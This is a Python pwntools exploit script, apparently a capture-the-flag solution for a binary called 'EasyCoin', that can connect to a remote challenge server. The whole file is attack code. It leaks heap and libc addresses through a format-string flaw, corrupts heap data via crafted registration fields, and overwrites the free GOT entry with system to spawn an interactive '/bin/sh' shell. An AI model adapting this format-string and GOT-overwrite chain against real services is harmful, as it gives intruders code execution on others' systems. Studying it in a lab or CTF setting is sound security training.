#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./EasyCoin"
elf=ELF(pwn_file)
libc=elf.libc
heap_address=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("117.50.6.7 ",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("libc address:0x%x"%libc.address)
    log.debug("heap address:0x%x"%heap_address)
    pause()

def reg(user,pwd):
    r.sendlineafter("> ","1")
    r.sendlineafter("> ",user)
    r.sendlineafter("> ",pwd)
    r.sendlineafter("> ",pwd)

def login(user,pwd):
    r.sendlineafter("> ","2")
    r.sendlineafter("> ",user)
    r.sendlineafter("> ",pwd)

def send(to,coin):
    r.sendlineafter("> ","2")
    r.sendlineafter("> ",to)
    r.sendlineafter("> ",str(coin))

def dele():
    r.sendlineafter("> ","5")

def leak(cmd):
    r.sendafter("> ",cmd)
    r.recvuntil("[-] Unknown Command: ")
    return r.recvuntil("---")[:-3]

def logout():
    r.sendlineafter("> ","6")

def change_pwd(pwd):
    r.sendlineafter("> ","4")
    r.sendlineafter("> ",pwd)

reg("a"*0x1e,"a"*8+p64(0xdeadbeef)+p64(2))
reg("b"*0x1e,"2"*0x1e)
login("b"*0x1e,"2"*0x1e)
heap_address=int(leak("%9$p")[:-2],16)-0xa0
libc.address=int(leak("%2$p")[:-2],16)-0x3c6780
send("a"*0x1e,heap_address+0x70)
send("a"*0x1e,1234)
logout()
login("a"*0x1e,"a"*8+p64(0xdeadbeef)+p64(1))
send("a"*0x1e,0xdead)
dele()
reg("c","c")
reg("a","a")
reg("b",p64(libc.search("/bin/sh").next())+p64(elf.got["free"]))
login("/bin/sh",p64(libc.sym["free"]))
change_pwd(p64(libc.sym["system"]))
dele()

r.interactive()


